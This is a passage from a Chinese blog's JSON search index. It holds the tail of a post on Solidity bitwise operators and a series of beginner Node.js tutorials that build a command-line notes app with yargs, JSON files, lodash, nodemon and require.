0x6a;//0110 1010 106 bytes1 public b = 0x6f;//0110 1111 111 function getlength() view public returns(uint,uint,uint)&#123; return (num1.length,num2.length,num3.length); &#125; // function changeLength() public &#123; // num1.length = 9; // &#125; function test1() public view returns(bool)&#123; return a&gt;b; &#125; function test2() public view returns(bool)&#123; return a&gt;=b; &#125; function test3() public view returns(bool)&#123; return a&lt;b; &#125; function test4() public view returns(bool)&#123; return a&lt;=b; &#125; function test5() public view returns(bool)&#123; return a==b; &#125; function test6() public view returns(bool)&#123; return a!=b; &#125; function test7() public view returns(bool)&#123; return num2 &gt;num1; &#125; // 0110 1010 // 0110 1111 //&amp;0110 1010 106 0x6a //|0110 1111 111 0x6f //^0000 0101 5 0x05 //~1001 0101 149 0x95 //&lt;1101 0100 212 0xd4 //&gt;0011 0101 53 0x35 function weiTest1() public view returns(bytes1)&#123; return a &amp; b; &#125; function weiTest2() public view returns(bytes1)&#123; return a | b; &#125; function weiTest3() public view returns(bytes1)&#123; return a ^ b; &#125; function weiTest4() public view returns(bytes1)&#123; return ~a; &#125; function weiTest5() public view returns(bytes1)&#123; return a&lt;&lt;1; &#125; function weiTest6() public view returns(bytes1)&#123; return a &gt;&gt;1; &#125;&#125;","categories":[{"name":"智能合约 solidity语法","slug":"智能合约-solidity语法","permalink":"https://dreamerjonson.com/categories/智能合约-solidity语法/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"}]},{"title":"nodejs渐入佳境[11]-yargs获取用户输入高级用法","slug":"node-11-yargs","date":"2018-11-14T06:45:44.000Z","updated":"2018-11-29T03:10:51.579Z","comments":true,"path":"2018/11/14/node-11-yargs/","link":"","permalink":"https://dreamerjonson.com/2018/11/14/node-11-yargs/","excerpt":"","text":"yargs高级用法，用于输出帮助信息，缩写提示等。 app.js: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162//打印字符串const yargs = require('yargs');const nodes = require('./nodes.js')const argv = yargs .command('add','add a new note',&#123; //add为命令参数，第二个为说明 title:&#123; //--titile describe:'Title of note', demand:true, //必须要的参数 alias:'t' //缩写 //--t &#125;, body:&#123; describe:'Body of note', demand:true, alias:'b' &#125; &#125;) .command('list','List all notes') .command('read','Read a note',&#123; title:&#123; describe:'Title of note', demand:true, alias:'t' &#125; &#125;) .command('remove','Remove a note',&#123; title:&#123; describe:'Title of note', demand:true, alias:'t' &#125; &#125;) .help() .argv;var command = process.argv[2];if(command==='add')&#123; var note = nodes.addNote(argv.title,argv.body); if(note)&#123; console.log('add success'); console.log(`title:$&#123;note.title&#125;`); console.log(`body:$&#123;note.body&#125;`); &#125;&#125;else if(command === 'list')&#123; var allnotes = nodes.getAll(); allnotes.forEach((note)=&gt;&#123; console.log(note)&#125;);&#125;else if(command =='read')&#123; var note = nodes.getNote(argv.title); if(note)&#123; console.log('find'); console.log(`title:$&#123;note.title&#125;`); console.log(`body:$&#123;note.body&#125;`); &#125;else&#123; console.log('note not found'); &#125;&#125;else if(command=='remove')&#123; var noteRemoved = nodes.removeNote(argv.title); var message = noteRemoved?'Note was removed':'note not found'; console.log(message);&#125;else&#123; console.log('command not find');&#125; nodes.js 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263console.log('start nodes.js');const fs = require('fs');//从文件中获取节点var fetchNode = ()=&gt;&#123; try&#123; var notesString = fs.readFileSync('notes-data.json'); return JSON.parse(notesString); &#125;catch(e)&#123; return []; &#125;&#125;//保存节点到文件var saveNote = (notes)=&gt;&#123; fs.writeFileSync('notes-data.json',JSON.stringify(notes));&#125;//增加节点，如果新增返回新增节点。var addNote = (title,body)=&gt;&#123; var notes = fetchNode(); var note = &#123; title, body &#125;; //筛选出相同的节点 var duplicateNotes = notes.filter((note)=&gt;note.title===title); //没有相同的节点 if(duplicateNotes.length ===0)&#123; notes.push(note); saveNote(notes); return note; &#125;&#125;var getAll = ()=&gt;&#123; var notes = fetchNode(); return notes;&#125;;var getNote = (title)=&gt;&#123; var notes = fetchNode(); //筛选出相同的节点 var duplicateNotes = notes.filter((note)=&gt;note.title===title); return duplicateNotes[0];&#125;;var removeNote = (title)=&gt;&#123; var notes = fetchNode(); //筛选出不同的节点 var duplicateNotes = notes.filter((note)=&gt;note.title!==title); saveNote(duplicateNotes); return notes.length !==duplicateNotes.length;&#125;;module.exports = &#123; addNote, getAll, getNote, removeNote&#125;; 测试 打开控制台，在当前目录下输入： 1&gt; node app.js add --help 控制台返回结果： 123456789app.js addadd a new note选项： --version 显示版本号 [布尔] --help 显示帮助信息 [布尔] --title, -t Title of note [必需] --body, -b Body of note [必需] 输入： 1&gt; node app.js --help 控制台返回结果： 1234567891011app.js [命令]命令： app.js add add a new note app.js list List all notes app.js read Read a note app.js remove Remove a note选项： --version 显示版本号 [布尔] --help 显示帮助信息 [布尔]","categories":[{"name":"nodejs","slug":"nodejs","permalink":"https://dreamerjonson.com/categories/nodejs/"}],"tags":[{"name":"nodejs 前端","slug":"nodejs-前端","permalink":"https://dreamerjonson.com/tags/nodejs-前端/"}]},{"title":"nodejs渐入佳境[10]-案例-用户输入+json增删查改","slug":"node-10","date":"2018-11-14T04:11:04.000Z","updated":"2018-11-29T03:10:29.940Z","comments":true,"path":"2018/11/14/node-10/","link":"","permalink":"https://dreamerjonson.com/2018/11/14/node-10/","excerpt":"","text":"对于之前的代码进行封装 原始文件app.js 对于返回节点进行判断，如果新增了节点，就打印新增节点。 12345678910111213141516171819202122232425262728//打印字符串const yargs = require('yargs');const nodes = require('./nodes.js')console.log('Start app.');console.log(process.argv);console.log('yargs',yargs.argv);const argv = yargs.argv;var command = process.argv[2];if(command==='add')&#123; var note = nodes.addNote(argv.title,argv.body); if(note)&#123; console.log('add success'); console.log(`title:$&#123;note.title&#125;`); console.log(`body:$&#123;note.body&#125;`); &#125;&#125;else if(command === 'list')&#123; nodes.getAll();&#125;else if(command =='read')&#123; nodes.getNote(argv.title);&#125;else if(command=='remove')&#123; nodes.removeNote(argv.title);&#125;else&#123; console.log('command not find');&#125; notes.js: 封装 获取节点以及保存节点、返回节点。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556console.log('start nodes.js');const fs = require('fs');//从文件中获取节点var fetchNode = ()=&gt;&#123; try&#123; var notesString = fs.readFileSync('notes-data.json'); return JSON.parse(notesString); &#125;catch(e)&#123; return []; &#125;&#125;//保存节点到文件var saveNote = (notes)=&gt;&#123; fs.writeFileSync('notes-data.json',JSON.stringify(notes));&#125;//增加节点，如果新增返回新增节点。var addNote = (title,body)=&gt;&#123; var notes = fetchNode(); var note = &#123; title, body &#125;; //筛选出相同的节点 var duplicateNotes = notes.filter((note)=&gt;note.title===title); //没有相同的节点 if(duplicateNotes.length ===0)&#123; notes.push(note); saveNote(notes); return note; &#125;&#125;var getAll = ()=&gt;&#123;console.log('Get All notes');&#125;;var getNote = (title)=&gt;&#123; console.log('getting note',title);&#125;;var removeNote = (title)=&gt;&#123; console.log('Removing note',title);&#125;;module.exports = &#123; addNote, getAll, getNote, removeNote&#125;; 测试 打开控制台，在当前目录下输入： 1&gt; node app.js add --title=&quot;buy book3&quot; --body=&quot;jonson&quot; 控制台返回结果： 1234567891011121314start nodes.jsStart app.[ &apos;/Users/jackson/.nvm/versions/node/v10.13.0/bin/node&apos;, &apos;/Users/jackson/Desktop/compaign/app.js&apos;, &apos;add&apos;, &apos;--title=buy book3&apos;, &apos;--body=jonson&apos; ]yargs &#123; _: [ &apos;add&apos; ], title: &apos;buy book3&apos;, body: &apos;jonson&apos;, &apos;$0&apos;: &apos;app.js&apos; &#125;add successtitle:buy book3body:jonson 移除节点 app.js： 123456789101112131415161718192021222324252627282930//打印字符串const yargs = require('yargs');const nodes = require('./nodes.js')console.log('Start app.');console.log(process.argv);console.log('yargs',yargs.argv);const argv = yargs.argv;var command = process.argv[2];if(command==='add')&#123; var note = nodes.addNote(argv.title,argv.body); if(note)&#123; console.log('add success'); console.log(`title:$&#123;note.title&#125;`); console.log(`body:$&#123;note.body&#125;`); &#125;&#125;else if(command === 'list')&#123; nodes.getAll();&#125;else if(command =='read')&#123; nodes.getNote(argv.title);&#125;else if(command=='remove')&#123; var noteRemoved = nodes.removeNote(argv.title); var message = noteRemoved?'Note was removed':'note not found'; console.log(message);&#125;else&#123; console.log('command not find');&#125; notes.js: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859console.log('start nodes.js');const fs = require('fs');//从文件中获取节点var fetchNode = ()=&gt;&#123; try&#123; var notesString = fs.readFileSync('notes-data.json'); return JSON.parse(notesString); &#125;catch(e)&#123; return []; &#125;&#125;//保存节点到文件var saveNote = (notes)=&gt;&#123; fs.writeFileSync('notes-data.json',JSON.stringify(notes));&#125;//增加节点，如果新增返回新增节点。var addNote = (title,body)=&gt;&#123; var notes = fetchNode(); var note = &#123; title, body &#125;; //筛选出相同的节点 var duplicateNotes = notes.filter((note)=&gt;note.title===title); //没有相同的节点 if(duplicateNotes.length ===0)&#123; notes.push(note); saveNote(notes); return note; &#125;&#125;var getAll = ()=&gt;&#123;console.log('Get All notes');&#125;;var getNote = (title)=&gt;&#123; console.log('getting note',title);&#125;;var removeNote = (title)=&gt;&#123; var notes = fetchNode(); //筛选出不同的节点 var duplicateNotes = notes.filter((note)=&gt;note.title!==title); saveNote(duplicateNotes); return notes.length !==duplicateNotes.length;&#125;;module.exports = &#123; addNote, getAll, getNote, removeNote&#125;; 测试2 打开控制台，在当前目录下输入： 1&gt; node app.js remove --title=&quot;buy book2&quot; 控制台返回结果并且josn文件中对应元素被移除： 12345678start nodes.jsStart app.[ &apos;/Users/jackson/.nvm/versions/node/v10.13.0/bin/node&apos;, &apos;/Users/jackson/Desktop/compaign/app.js&apos;, &apos;remove&apos;, &apos;--title=buy book2&apos; ]yargs &#123; _: [ &apos;remove&apos; ], title: &apos;buy book2&apos;, &apos;$0&apos;: &apos;app.js&apos; &#125;Note was removed 获取节点 app.js 12345678910111213141516171819202122232425262728293031323334353637//打印字符串const yargs = require('yargs');const nodes = require('./nodes.js')console.log('Start app.');console.log(process.argv);console.log('yargs',yargs.argv);const argv = yargs.argv;var command = process.argv[2];if(command==='add')&#123; var note = nodes.addNote(argv.title,argv.body); if(note)&#123; console.log('add success'); console.log(`title:$&#123;note.title&#125;`); console.log(`body:$&#123;note.body&#125;`); &#125;&#125;else if(command === 'list')&#123; nodes.getAll();&#125;else if(command =='read')&#123; var note = nodes.getNote(argv.title); if(note)&#123; console.log('find'); console.log(`title:$&#123;note.title&#125;`); console.log(`body:$&#123;note.body&#125;`); &#125;else&#123; console.log('note not found'); &#125;&#125;else if(command=='remove')&#123; var noteRemoved = nodes.removeNote(argv.title); var message = noteRemoved?'Note was removed':'note not found'; console.log(message);&#125;else&#123; console.log('command not find');&#125; notes.js: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162console.log('start nodes.js');const fs = require('fs');//从文件中获取节点var fetchNode = ()=&gt;&#123; try&#123; var notesString = fs.readFileSync('notes-data.json'); return JSON.parse(notesString); &#125;catch(e)&#123; return []; &#125;&#125;//保存节点到文件var saveNote = (notes)=&gt;&#123; fs.writeFileSync('notes-data.json',JSON.stringify(notes));&#125;//增加节点，如果新增返回新增节点。var addNote = (title,body)=&gt;&#123; var notes = fetchNode(); var note = &#123; title, body &#125;; //筛选出相同的节点 var duplicateNotes = notes.filter((note)=&gt;note.title===title); //没有相同的节点 if(duplicateNotes.length ===0)&#123; notes.push(note); saveNote(notes); return note; &#125;&#125;var getAll = ()=&gt;&#123;&#125;;var getNote = (title)=&gt;&#123; var notes = fetchNode(); //筛选出相同的节点 var duplicateNotes = notes.filter((note)=&gt;note.title===title); return duplicateNotes[0];&#125;;var removeNote = (title)=&gt;&#123; var notes = fetchNode(); //筛选出不同的节点 var duplicateNotes = notes.filter((note)=&gt;note.title!==title); saveNote(duplicateNotes); return notes.length !==duplicateNotes.length;&#125;;module.exports = &#123; addNote, getAll, getNote, removeNote&#125;; 测试3 打开控制台，在当前目录下输入： 1&gt; node app.js read --title=&quot;buy book3&quot; 控制台返回结果： 1234567891011start nodes.jsStart app.[ &apos;/Users/jackson/.nvm/versions/node/v10.13.0/bin/node&apos;, &apos;/Users/jackson/Desktop/compaign/app.js&apos;, &apos;read&apos;, &apos;--title=buy book3&apos;, &apos;--body=123&apos; ]yargs &#123; _: [ &apos;read&apos; ], title: &apos;buy book3&apos;, body: 123, &apos;$0&apos;: &apos;app.js&apos; &#125;findtitle:buy book3body:jonson 列出所有节点 app.js 12345678910111213141516171819202122232425262728293031323334353637//打印字符串const yargs = require('yargs');const nodes = require('./nodes.js')console.log('Start app.');console.log(process.argv);console.log('yargs',yargs.argv);const argv = yargs.argv;var command = process.argv[2];if(command==='add')&#123; var note = nodes.addNote(argv.title,argv.body); if(note)&#123; console.log('add success'); console.log(`title:$&#123;note.title&#125;`); console.log(`body:$&#123;note.body&#125;`); &#125;&#125;else if(command === 'list')&#123; var allnotes = nodes.getAll(); allnotes.forEach((note)=&gt;&#123; console.log(note)&#125;);&#125;else if(command =='read')&#123; var note = nodes.getNote(argv.title); if(note)&#123; console.log('find'); console.log(`title:$&#123;note.title&#125;`); console.log(`body:$&#123;note.body&#125;`); &#125;else&#123; console.log('note not found'); &#125;&#125;else if(command=='remove')&#123; var noteRemoved = nodes.removeNote(argv.title); var message = noteRemoved?'Note was removed':'note not found'; console.log(message);&#125;else&#123; console.log('command not find');&#125; nodes.js 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556console.log('start nodes.js');const fs = require('fs');//从文件中获取节点var fetchNode = ()=&gt;&#123; try&#123; var notesString = fs.readFileSync('notes-data.json'); return JSON.parse(notesString); &#125;catch(e)&#123; return []; &#125;&#125;//保存节点到文件var saveNote = (notes)=&gt;&#123; fs.writeFileSync('notes-data.json',JSON.stringify(notes));&#125;//增加节点，如果新增返回新增节点。var addNote = (title,body)=&gt;&#123; var notes = fetchNode(); var note = &#123; title, body &#125;; //筛选出相同的节点 var duplicateNotes = notes.filter((note)=&gt;note.title===title); //没有相同的节点 if(duplicateNotes.length ===0)&#123; notes.push(note); saveNote(notes); return note; &#125;&#125;var getAll = ()=&gt;&#123; var notes = fetchNode(); return notes;&#125;;var getNote = (title)=&gt;&#123; var notes = fetchNode(); //筛选出相同的节点 var duplicateNotes = notes.filter((note)=&gt;note.title===title); return duplicateNotes[0];&#125;;var removeNote = (title)=&gt;&#123; var notes = fetchNode(); //筛选出不同的节点 var duplicateNotes = notes.filter((note)=&gt;note.title!==title); saveNote(duplicateNotes); return notes.length !==duplicateNotes.length;&#125;; 测试4 打开控制台，在当前目录下输入： 1&gt; node app.js list 控制台返回结果： 12345678start nodes.jsStart app.[ &apos;/Users/jackson/.nvm/versions/node/v10.13.0/bin/node&apos;, &apos;/Users/jackson/Desktop/compaign/app.js&apos;, &apos;list&apos; ]yargs &#123; _: [ &apos;list&apos; ], &apos;$0&apos;: &apos;app.js&apos; &#125;&#123; title: &apos;buy book3&apos;, body: &apos;jonson&apos; &#125;&#123; title: &apos;buy book2&apos;, body: &apos;jonson&apos; &#125;","categories":[{"name":"nodejs","slug":"nodejs","permalink":"https://dreamerjonson.com/categories/nodejs/"}],"tags":[{"name":"nodejs 前端","slug":"nodejs-前端","permalink":"https://dreamerjonson.com/tags/nodejs-前端/"}]},{"title":"nodejs渐入佳境[9]-保存节点到json文件","slug":"node-9","date":"2018-11-13T13:03:36.000Z","updated":"2018-11-29T03:09:13.036Z","comments":true,"path":"2018/11/13/node-9/","link":"","permalink":"https://dreamerjonson.com/2018/11/13/node-9/","excerpt":"","text":"原始文件 app.js: 12345678910111213141516171819202122const yargs = require('yargs');const nodes = require('./nodes.js')console.log('Start app.');console.log(process.argv);console.log('yargs',yargs.argv);const argv = yargs.argv;var command = process.argv[2];if(command==='add')&#123; nodes.addNote(argv.title,argv.body);&#125;else if(command === 'list')&#123; nodes.getAll();&#125;else if(command =='read')&#123; nodes.getNote(argv.title);&#125;else if(command=='remove')&#123; nodes.removeNote(argv.title);&#125;else&#123; console.log('command not find');&#125; nodes.js 123456789101112131415161718192021222324252627282930313233343536373839404142console.log('start nodes.js');const fs = require('fs');var addNote = (title,body)=&gt;&#123; var notes = []; var note = &#123; title, body &#125;; try&#123; //读取json文件，读出来是string var notesString = fs.readFileSync('notes-data.json'); // string转换为json对象 notes = JSON.parse(notesString); &#125;catch(e)&#123; &#125; //增加 notes.push(note); //保存 fs.writeFileSync('notes-data.json',JSON.stringify(notes));&#125;var getAll = ()=&gt;&#123;console.log('Get All notes');&#125;;var getNote = (title)=&gt;&#123; console.log('getting note',title);&#125;;var removeNote = (title)=&gt;&#123; console.log('Removing note',title);&#125;;module.exports = &#123; addNote, getAll, getNote, removeNote&#125;; 打开控制台，在当前目录下输入： 1&gt; node app.js add --title=&quot;buy book2&quot; --body=&quot;jonson&quot; 将节点添加到notes-data.json文件中. 再次输入： 1&gt; node app.js add --title=&quot;buy book2&quot; --body=&quot;jonson&quot; notes-data.json: 1[&#123;\"title\":\"buy book2\",\"body\":\"jonson\"&#125;,&#123;\"title\":\"buy book2\",\"body\":\"jonson\"&#125;] 改进 不添加重复的节点 12345678910111213141516171819202122232425262728293031323334353637383940414243444546console.log('start nodes.js');const fs = require('fs');var addNote = (title,body)=&gt;&#123; var notes = []; var note = &#123; title, body &#125;; try&#123; var notesString = fs.readFileSync('notes-data.json'); notes = JSON.parse(notesString); &#125;catch(e)&#123; &#125; //筛选出相同的节点 var duplicateNotes = notes.filter((note)=&gt;note.title===title); //没有相同的节点 if(duplicateNotes.length ===0)&#123; notes.push(note); fs.writeFileSync('notes-data.json',JSON.stringify(notes)); &#125;&#125;var getAll = ()=&gt;&#123;console.log('Get All notes');&#125;;var getNote = (title)=&gt;&#123; console.log('getting note',title);&#125;;var removeNote = (title)=&gt;&#123; console.log('Removing note',title);&#125;;module.exports = &#123; addNote, getAll, getNote, removeNote&#125;; 再次输入不会添加节点： 1&gt; node app.js add --title=&quot;buy book2&quot; --body=&quot;jonson&quot;","categories":[{"name":"nodejs","slug":"nodejs","permalink":"https://dreamerjonson.com/categories/nodejs/"}],"tags":[{"name":"nodejs 前端","slug":"nodejs-前端","permalink":"https://dreamerjonson.com/tags/nodejs-前端/"}]},{"title":"nodejs渐入佳境[8]-json处理","slug":"node-8-json","date":"2018-11-13T12:53:49.000Z","updated":"2018-11-29T03:05:17.090Z","comments":true,"path":"2018/11/13/node-8-json/","link":"","permalink":"https://dreamerjonson.com/2018/11/13/node-8-json/","excerpt":"","text":"原始文件 json.js: 1234567891011121314151617181920212223242526//字符串var personString = '&#123;\"name\":\"Andrew\",\"age\":25&#125;';console.log( typeof personString);//string//转换为对象var person = JSON.parse(personString);console.log(typeof person);//objectconsole.log(person);//&#123; name: 'Andrew', age: 25 &#125;const fs= require('fs');//对象var originalNote = &#123; title:'some title', body:'some body'&#125;;//转换为字符串var originalNoteString = JSON.stringify(originalNote);//字符串写入到文件中fs.writeFileSync('notes.json',originalNoteString);//读取文件var noteString = fs.readFileSync('notes.json');//转换为对象var note = JSON.parse(noteString);console.log(typeof note);//objectconsole.log(note.title);//some title 获取用户输入 打开控制台，在当前目录下输入： 1&gt; node json.js 输出字符串 12345stringobject&#123; name: &apos;Andrew&apos;, age: 25 &#125;objectsome title","categories":[{"name":"nodejs","slug":"nodejs","permalink":"https://dreamerjonson.com/categories/nodejs/"}],"tags":[{"name":"nodejs 前端","slug":"nodejs-前端","permalink":"https://dreamerjonson.com/tags/nodejs-前端/"}]},{"title":"nodejs渐入佳境[7]-yargs处理命令行参数","slug":"node-7-yargs","date":"2018-11-13T12:08:06.000Z","updated":"2018-11-29T03:05:07.426Z","comments":true,"path":"2018/11/13/node-7-yargs/","link":"","permalink":"https://dreamerjonson.com/2018/11/13/node-7-yargs/","excerpt":"","text":"yargs用于方便的处理命令行参数。导入yargs包，在项目路径下： 1&gt; npm install --save yargs 原始文件 app.js: 12345678const yargs = require('yargs');console.log('Start app.');console.log(process.argv);console.log('yargs',yargs.argv);var command = process.argv[2]; 获取用户输入 打开控制台，在当前目录下输入： 1&gt; node app.js remove --title=&quot;buy book&quot; 输出字符串 1234567Start app.[ &apos;/Users/jackson/.nvm/versions/node/v10.13.0/bin/node&apos;, &apos;/Users/jackson/Desktop/compaign/app.js&apos;, &apos;remove&apos;, &apos;--title=buy book&apos; ]yargs &#123; _: [ &apos;remove&apos; ], title: &apos;buy book&apos;, &apos;$0&apos;: &apos;app.js&apos; &#125;Remove node app.js 1234567891011121314151617181920212223//打印字符串const yargs = require('yargs');const nodes = require('./nodes.js')console.log('Start app.');console.log(process.argv);console.log('yargs',yargs.argv);const argv = yargs.argv;var command = process.argv[2];if(command==='add')&#123; nodes.addNote(argv.title,argv.body);&#125;else if(command === 'list')&#123; nodes.getAll();&#125;else if(command =='read')&#123; nodes.getNote(argv.title);&#125;else if(command=='remove')&#123; nodes.removeNote(argv.title);&#125;else&#123; console.log('command not find');&#125; notes.js: 12345678910111213141516171819202122232425console.log('start nodes.js');var addNote = (title,body)=&gt;&#123;console.log('Adding note',title,body);&#125;var getAll = ()=&gt;&#123;console.log('Get All notes');&#125;;var getNote = (title)=&gt;&#123; console.log('getting note',title);&#125;;var removeNote = (title)=&gt;&#123; console.log('Removing note',title);&#125;;module.exports = &#123; addNote, getAll, getNote, removeNote&#125;; 测试 打开控制台，在当前目录下输入： 1&gt; node app.js remove --title=&quot;buy book&quot; 输出字符串: 12345678start nodes.jsStart app.[ &apos;/Users/jackson/.nvm/versions/node/v10.13.0/bin/node&apos;, &apos;/Users/jackson/Desktop/compaign/app.js&apos;, &apos;remove&apos;, &apos;--title=buy book&apos; ]yargs &#123; _: [ &apos;remove&apos; ], title: &apos;buy book&apos;, &apos;$0&apos;: &apos;app.js&apos; &#125;Removing note buy book 打开控制台，在当前目录下输入： 1&gt; node app.js add --title=&quot;buy book&quot; --body=&quot;jonson&quot; 输出字符串: 123456789101112start nodes.jsStart app.[ &apos;/Users/jackson/.nvm/versions/node/v10.13.0/bin/node&apos;, &apos;/Users/jackson/Desktop/compaign/app.js&apos;, &apos;add&apos;, &apos;--title=buy book&apos;, &apos;--body=jonson&apos; ]yargs &#123; _: [ &apos;add&apos; ], title: &apos;buy book&apos;, body: &apos;jonson&apos;, &apos;$0&apos;: &apos;app.js&apos; &#125;Adding note buy book jonson","categories":[{"name":"nodejs","slug":"nodejs","permalink":"https://dreamerjonson.com/categories/nodejs/"}],"tags":[{"name":"nodejs 前端","slug":"nodejs-前端","permalink":"https://dreamerjonson.com/tags/nodejs-前端/"}]},{"title":"nodejs渐入佳境[6]-获取用户输入","slug":"node-6","date":"2018-11-13T09:50:36.000Z","updated":"2018-11-29T03:04:53.943Z","comments":true,"path":"2018/11/13/node-6/","link":"","permalink":"https://dreamerjonson.com/2018/11/13/node-6/","excerpt":"","text":"原始文件 app.js: 123console.log('Start app.');console.log(process.argv); 获取用户输入 打开控制台，在当前目录下输入： 1&gt; nodemon app.js add 输出字符串 默认第一个为node系统路径 第二个为文件路径 后面为输入的控制台参数 1234Start app.[ &apos;/Users/jackson/.nvm/versions/node/v10.13.0/bin/node&apos;, &apos;/Users/jackson/Desktop/compaign/app.js&apos;, &apos;add&apos; ] 打开控制台，在当前目录下输入： 1&gt; node app.js add list 输出字符串: 1234[ &apos;/Users/jackson/.nvm/versions/node/v10.13.0/bin/node&apos;, &apos;/Users/jackson/Desktop/compaign/app.js&apos;, &apos;add&apos;, &apos;list&apos; ] 利用命令行执行不同操作 123456789101112131415161718192021//打印字符串console.log('Start app.');console.log(process.argv);//获取第三个参数var command = process.argv[2];//不同命令执行不同操作if(command==='add')&#123; console.log('Adding new note');&#125;else if(command === 'list')&#123; console.log('Listing allnodes');&#125;else if(command =='read')&#123; console.log('reading node');&#125;else if(command=='remove')&#123; console.log('Remove node');&#125;else&#123; console.log('command not find');&#125; 缺点 打开控制台，在当前目录下输入： 1&gt; node app.js remove --title=&quot;buy book&quot; 不能很好的区分开’–title=buy book’ 输出字符串: 123456Start app.[ &apos;/Users/jackson/.nvm/versions/node/v10.13.0/bin/node&apos;, &apos;/Users/jackson/Desktop/compaign/app.js&apos;, &apos;remove&apos;, &apos;--title=buy book&apos; ]Remove node","categories":[{"name":"nodejs","slug":"nodejs","permalink":"https://dreamerjonson.com/categories/nodejs/"}],"tags":[{"name":"nodejs 前端","slug":"nodejs-前端","permalink":"https://dreamerjonson.com/tags/nodejs-前端/"}]},{"title":"nodejs渐入佳境[5]-nodemon实现自动测试","slug":"node-5-nodemon","date":"2018-11-13T03:59:34.000Z","updated":"2018-11-29T03:04:44.819Z","comments":true,"path":"2018/11/13/node-5-nodemon/","link":"","permalink":"https://dreamerjonson.com/2018/11/13/node-5-nodemon/","excerpt":"","text":"nodemon nodemon帮助我们，当我们修改文件时，node程序自动从新执行。 安装 1&gt; npm install -g nodemon 原始文件 app.js: 12345678910console.log('Start app.');const _ = require('lodash');判断是否为字符串console.log(_.isString(true));console.log(_.isString(\"abc\"));//筛选重复数组var filteredArray = _.uniq(['Jonson',1,'Jonson',1,2,3,4]);console.log(filteredArray); 打开控制台，在当前目录下输入： 1&gt; nodemon app.js 输出字符串 12345678[nodemon] 1.18.6[nodemon] to restart at any time, enter `rs`[nodemon] watching: *.*[nodemon] starting `node app.js`Start app.falsetrue[ &apos;Jonson&apos;, 1, 2, 3, 4 ] 修改文件： 123var filteredArray = _.uniq(['Jonson',1,'Jonson',1,2,3,4]);替换为：var filteredArray = _.uniq(['Jonson',1,'Jonson',1]); 自动输出字符串: 1234567[nodemon] clean exit - waiting for changes before restart[nodemon] restarting due to changes...[nodemon] starting `node app.js`Start app.falsetrue[ 'Jonson', 1 ]","categories":[{"name":"nodejs","slug":"nodejs","permalink":"https://dreamerjonson.com/categories/nodejs/"}],"tags":[{"name":"nodejs 前端","slug":"nodejs-前端","permalink":"https://dreamerjonson.com/tags/nodejs-前端/"}]},{"title":"nodejs渐入佳境[4]-第三方包","slug":"node-4","date":"2018-11-13T03:50:09.000Z","updated":"2018-11-29T03:04:34.214Z","comments":true,"path":"2018/11/13/node-4/","link":"","permalink":"https://dreamerjonson.com/2018/11/13/node-4/","excerpt":"","text":"导入第三方包 nodejs 有丰富的第三方模块导入，例如要导入lodash包，在项目路径下： 1&gt; npm install --save lodash app.js: 12345678910console.log('Start app.');const _ = require('lodash');判断是否为字符串console.log(_.isString(true));console.log(_.isString(\"abc\"));//筛选重复数组var filteredArray = _.uniq(['Jonson',1,'Jonson',1,2,3,4]);console.log(filteredArray); 打开控制台，在当前目录下输入： 1&gt; node app.js 输出字符串 1234Start app.falsetrue[ &apos;Jonson&apos;, 1, 2, 3, 4 ] 参考： npm 官网 lodash文档","categories":[{"name":"nodejs","slug":"nodejs","permalink":"https://dreamerjonson.com/categories/nodejs/"}],"tags":[{"name":"nodejs 前端","slug":"nodejs-前端","permalink":"https://dreamerjonson.com/tags/nodejs-前端/"}]},{"title":"nodejs渐入佳境[3]-require导入模块","slug":"node-3-require","date":"2018-11-13T03:05:12.000Z","updated":"2018-11-29T03:04:26.331Z","comments":true,"path":"2018/11/13/node-3-require/","link":"","permalink":"https://dreamerjonson.com/2018/11/13/node-3-require/","excerpt":"","text":"require 导入其他文件 require可以执行其他文件的内容。 新建文件: nodes.js: 1console.log('start nodes.js'); app.js: 1234567891011121314151617//打印字符串console.log('Start app.');const nodes = require('./nodes.js')//导入node自带modules，fs文件操作const fs = require('fs');//os系统操作const os = require('os');//获取系统名字var user = os.userInfo();//添加字符串到回调函数中，并执行回调函数。出错就会报错，不出错就会打印出'The \"data to append\" was appended to file!'fs.appendFile('greetings.txt',`Hello $&#123;user.username&#125;`,(err) =&gt; &#123; if (err) throw err; console.log('The \"data to append\" was appended to file!');&#125;); 打开控制台，在当前目录下输入： 1&gt; node app.js 输出字符串 123Start app.start nodes.jsThe &quot;data to append&quot; was appended to file! require 导入属性 nodes.js: 123console.log('start nodes.js');module.exports.age = 25; app.js: 1234567891011121314151617//打印字符串console.log('Start app.');const nodes = require('./nodes.js')//导入node自带modules，fs文件操作const fs = require('fs');//os系统操作const os = require('os');//获取系统名字var user = os.userInfo();//添加字符串到回调函数中，并执行回调函数。出错就会报错，不出错就会打印出'The \"data to append\" was appended to file!'fs.appendFile('greetings.txt',`Hello $&#123;user.username&#125; age $&#123;nodes.age&#125;`,(err) =&gt; &#123; if (err) throw err; console.log('The \"data to append\" was appended to file!');&#125;); 打开控制台，在当前目录下输入： 1&gt; node app.js 文件中存储：Hello jackson age 25 require 导入函数 nodes.js: 123456console.log('start nodes.js');module.exports.addNote = ()=&gt;&#123; console.log('addNode'); return 'New Node';&#125;; app.js: 123456console.log('Start app.');const nodes = require('./nodes.js') const res = nodes.addNote();console.log(res); 打开控制台，在当前目录下输入： 1&gt; node app.js 输出字符串 1234Start app.start nodes.jsaddNodeNew Node require 导入带参函数 nodes.js: 1234567891011console.log('start nodes.js');module.exports.add = (a,b)=&gt;&#123; return a+b;&#125;;module.exports.addNote = ()=&gt;&#123; console.log('addNode'); return 'New Node';&#125;; app.js: 1234567//打印字符串console.log('Start app.');const nodes = require('./nodes.js') const res = nodes.add(1,2);console.log(res); 打开控制台，在当前目录下输入： 1&gt; node app.js 输出字符串 123Start app.start nodes.js3","categories":[{"name":"nodejs","slug":"nodejs","permalink":"https://dreamerjonson.com/categories/nodejs/"}],"tags":[{"name":"nodejs 